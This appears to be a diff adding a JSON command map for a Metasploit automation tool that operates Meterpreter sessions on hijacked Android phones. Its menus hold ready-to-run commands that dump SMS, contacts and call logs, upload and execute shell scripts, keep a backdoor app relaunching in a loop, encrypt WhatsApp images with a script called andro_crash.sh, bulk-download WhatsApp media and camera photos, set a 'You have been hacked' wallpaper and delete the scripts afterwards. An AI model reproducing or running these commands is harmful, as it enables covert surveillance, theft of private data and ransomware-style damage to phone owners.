@@ -1,0 +1,81 @@
+{
+        
+    
+    "meterpreter":{
+        "a":"dumping",
+        "b":"changing_wallpapers",
+        "c":"uploading_files",
+        "d":"executing_files", 
+        "e":"executing_backdoor_cmd",
+        "f":"encoding/decoding_whatsapp_files",
+        "g":"downloading_whatsapp_files",
+        "h":"some_fun",
+        "i":"deleting_files",
+        "j":"enter_any_meterpreter_command"
+    },  
+
+    "dumping":[
+        "dump_sms",
+        "dump_contacts",
+        "dump_calllog"
+        ],
+    
+    "changing_wallpapers":[
+        "run post/multi/manage/set_wallpaper  WALLPAPER_FILE=/home/kaulik/Desktop/AUTO-MSF/Cover-You_have_been_hacked.png",
+        "run post/multi/manage/set_wallpaper  WALLPAPER_FILE=/usr/share/themes/wp6559346-shree-krishna-god-full-hd-desktop-wallpapers.jpg"
+    ],
+
+    "uploading_files":[
+        "cd /sdcard/Android",
+        "upload /home/kaulik/Desktop/AUTO-MSF/andro.sh",
+        "upload /home/kaulik/Desktop/AUTO-MSF/photo.sh",
+        "upload /home/kaulik/Desktop/AUTO-MSF/andro_crash.sh"
+    ],
+    "executing_files":[
+        "execute -z -f 'sh /sdcard/Android/andro.sh'",
+        "execute -z -f 'sh /sdcard/Android/photo.sh'",
+        "execute -z -f 'sh /sdcard/Android/andro_crash.sh mk /sdcard'",
+        "execute -z -f 'sh /sdcard/Android/andro_crash.sh mk /sdcard/Music/'",
+        "execute -z -f 'sh /sdcard/Android/andro_crash.sh mk /sdcard/Telegram/'"
+    ],
+    "executing_backdoor_cmd":[
+        "execute -z -f 'sh while true;do;am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity;sleep 5;done'",
+        "execute -z -f 'sh while true;do;am start --user 0 -n com.google.android.apps.photos/.home.HomeActivity;sleep 5;done'"
+
+    ],
+    "encoding/decoding_whatsapp_files":[
+        "cd '/storage/emulated/0/WhatsApp/Media/Whatsapp Images'",
+        "execute -z -f 'sh /sdcard/Android/andro_crash.sh en /storage/emulated/0/Whatsapp/Media/Whatsapp Images'"
+    ],
+    "downloading_whatsapp_files":[
+        "cd '/storage/emulated/0/WhatsApp/Media/Whatsapp Images'",
+        "download -a *",
+        "cd '/storage/emulated/0/WhatsApp/Media/Whatsapp Images/Sent'",
+        "download -a * ",
+        "cd '/storage/emulated/0/DCIM/Camera'",
+        "download -a *",
+        "cd '/storage/emulated/0/WhatsApp/Media/.Statuses'",
+        "download -a *",
+        "cd '/storage/emulated/0/WhatsApp/Media/.Links'",
+        "download -a *",
+        "cd '/storage/emulated/0/WhatsApp/Media/.Profile Photos' ",
+        "Download -a *"
+
+    ],
+    "some_fun":[
+        "set_audio_mode -m 0",
+        "cd /sdcard/Android",
+        "del andro_crash.sh"
+    ],
+    "deleting_files":[
+        "del andro.sh",
+        "del photo.sh",
+        "del andro_crash.sh"
+
+    ],
+    "enter_any_meterpreter_command":[]
+
+    
+
+
+}
